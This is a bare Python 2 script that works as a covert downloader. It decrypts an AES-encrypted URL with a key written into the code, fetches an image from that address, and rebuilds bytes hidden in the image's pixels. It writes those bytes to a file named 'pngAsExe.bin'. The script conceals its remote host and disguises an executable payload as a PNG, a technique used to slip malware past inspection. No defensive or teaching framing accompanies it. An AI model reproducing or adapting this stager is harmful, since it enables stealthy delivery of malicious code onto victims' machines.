import urllib2
import requests
from PIL import Image
import io
from Crypto.Cipher import AES

BS = 32
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

def get_encoded_data(bytes):
    imo = Image.open(io.BytesIO(bytes))
    rawdata = list(imo.getdata())
    tsdata = ''
    for x in rawdata:
        for z in x:
            tsdata += chr(z)

    del rawdata
    return tsdata


class AESCipher:

    def __init__(self, key):
        self.key = ''.join(map(chr, key))

    def encrypt(self, raw):
        raw = pad(raw)
        cipher = AES.new(self.key, AES.MODE_ECB)
        return cipher.encrypt(raw)

    def decrypt(self, enc):
        cipher = AES.new(self.key, AES.MODE_ECB)
        return unpad(cipher.decrypt(enc))


def fetch_url(full_url):
    resp_content = "asd"
    try:
       print(full_url)
       resp_content = urllib2.urlopen(full_url).read() 
    except Exception as e:
        print('Error: %d' % e.getcode())

    return resp_content


def get_url_content(key):
    encrypted_url = '\xa6\xfa\x8fO\xba\x7f\x9d\xe2c\x81`\xf5\xd5\xf6\x07\x85\xfe[hr\xd6\x80?U\x90\x89)\xd1\xe9\xf0<\xfe'
    aes = AESCipher(bytearray(key, encoding='utf-8'))
    output = aes.decrypt(encrypted_url)
    full_url = output
    content = fetch_url(full_url)
    return content

content = get_url_content("95104475352405197696005814181948")
decdata = get_encoded_data(content)
with open('./pngAsExe.bin', 'wb') as f:
    f.write(decdata)
